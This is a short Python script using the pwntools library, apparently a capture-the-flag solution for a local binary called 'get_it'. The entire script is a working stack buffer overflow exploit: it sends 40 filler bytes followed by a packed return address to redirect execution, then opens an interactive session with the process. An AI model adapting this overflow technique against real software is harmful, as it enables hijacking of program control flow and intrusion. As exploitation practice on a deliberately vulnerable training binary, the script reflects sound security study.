#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'
e = context.binary = ELF("/tmp/get_it", checksec=False)
p = process()

payload = b'A'*40 + p64(0x4005B6+4)
p.sendlineafter(b"Do you gets it??\n", payload)

p.interactive()
